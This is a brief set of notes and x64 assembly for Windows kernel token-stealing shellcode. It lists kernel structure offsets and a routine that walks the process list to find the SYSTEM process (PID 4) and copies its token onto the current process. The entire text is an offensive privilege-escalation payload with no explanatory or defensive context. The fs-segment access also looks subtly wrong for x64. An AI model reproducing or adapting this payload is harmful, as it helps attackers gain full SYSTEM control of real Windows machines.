_KTHREAD = 0x188
_EPROCESS = 0x70

Active Process Links = 0x188
token_offset = 0x208

Token = fffff8a000004b60

high level process = fffffa8030f00040


SYS_PID = 4
PID_OFFSET - 0x180
TOKEN_OFFSET - 0x208
FLINK_OFFSET - 0x188
KTHREAD_OFFSET - 0x188
EPROCESS_OFFSET - 0x70


=================================
===== SHELLCODE START HERE ======
=================================
#
Store all needed registers first
#

push rax
push rcx
push rdx


xor rax, rax
mov rax, fs:[rax + 0x188]

mov rax, [rax + 0x70]

mov rcx, rax

mov rdx, 0x4

search:
mov rax, [rax + 0x188]
sub rax, 0x188
cmp [rax + 0x180], rdx
jnz search

mov rdx, [rax + 0x208]
mov [rcx + 0x208], rdx

pop rdx
pop rcx
pop rax
